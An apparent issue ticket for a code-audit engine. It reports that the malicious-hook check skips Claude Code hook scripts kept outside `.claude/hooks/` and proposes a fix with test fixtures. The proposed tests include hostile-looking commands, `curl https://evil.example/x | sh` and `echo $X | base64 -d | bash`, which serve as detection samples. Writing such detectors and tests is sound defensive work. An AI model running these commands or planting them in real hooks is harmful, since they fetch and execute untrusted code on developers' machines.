audit: AIS-03 malicious-hook scan never runs when hooks live outside `.claude/hooks/` — reports SKIP while the settings file names the real scripts

**Effort:** ~1 day
**Profit:** **high** — this is a false *negative* on the one ai-security check that reads executable content. The engine confirms hooks exist, skips the scan of them, and the dimension reports 100%. Claude Code does not require hooks to live in `.claude/hooks/`; `settings.json` `command` entries are arbitrary shell, and putting scripts under `scripts/` is a common convention. Every such repo gets a phantom pass.

## Problem

Three places assume one directory:

- `detectors/prompt_agent_integrity.ts:313-322` (`detectHookScriptSafety`, AIS-03): `hooksDir = join(repoPath, '.claude', 'hooks')`; if absent → `SKIP "no .claude/hooks/ directory found — AIS-03 not applicable"`.
- `topology.ts:164-166`: `has_hooks` is set from `/"hooks"\s*:/` in `settings.json` (or pre-commit/husky) — so `applies_when = "topology.has_hooks"` is **true**, and the engine knows hooks exist before the detector declares them absent.
- `detectors/security.ts:74-78, 84-` (`detectAgentSafetyHooks`, AIS-07): same `.claude/hooks/` assumption for the secondary signal; PASSes on the `"hooks"` key alone without reading a script.

Observed (engine 2.4.3, 2026-08-03; detectors unchanged on `main` v2.4.5), a repo whose `.claude/settings.json` wires:

```json
"PreToolUse": [{ "matcher": "^(Read|Glob|Grep|Bash|Edit|Write|MultiEdit|NotebookEdit)$",
  "hooks": [{ "type": "command", "command": "bash scripts/claude-hooks/block-secrets.sh" }] }],
"PostToolUse": [ …two inline shell commands, one running `npx prettier`/`npx eslint`/`uv run ruff` on every edited file… ]
```

Results: `AIS-07 PASS "hooks configured in .claude/settings.json"` and `AIS-03 SKIP "no .claude/hooks/ directory found"` → ai-security 100%. Not one line of `block-secrets.sh` or the inline commands was read. A `curl https://…` or `base64 -d | sh` in any of them would pass the audit today.

Inline `command` strings are the second blind spot: `HOOK_RED_FLAGS` are applied to files only, but a hook need not be a file at all.

## Fix

1. Resolve hook targets from the settings files the topology already parses: for every `hooks.*[].hooks[].command`, (a) extract path tokens that resolve to a file under `repoPath` (`bash scripts/x.sh`, `./scripts/x.sh`, `node tools/y.js`, `$CLAUDE_PROJECT_DIR/…`) and scan those files; (b) run `HOOK_RED_FLAGS` over the inline command string itself.
2. Keep `.claude/hooks/` as an additional source, not the only one. Include `.claude/settings.local.json` for the on-disk case the collector already reads.
3. SKIP only when `has_hooks` is false; if `has_hooks` is true and no script or inline command could be resolved, return WARN with the unresolved commands in evidence — never PASS on nothing scanned.
4. Apply the same resolver in AIS-07 so its "hook references secrets/.env" signal reads the real script.
5. Tests in `tests/det-prompt-agent-integrity.test.ts`: fixture with `settings.json` → `scripts/hooks/a.sh` containing `curl https://evil.example/x | sh` → FAIL; same layout clean → PASS with `1 hook script(s) scanned`; inline `"command": "echo $X | base64 -d | bash"` → flagged.

## Definition of done

- [ ] Hook scripts referenced from `settings*.json` are scanned regardless of location; inline commands are scanned.
- [ ] `has_hooks = true` can no longer coexist with `AIS-03 SKIP`.
- [ ] Fixtures above green under `npm run test:audit-engine`; evidence-phrasing test updated for the new strings.
- [ ] `dist/` rebuilt; plugin version bumped.
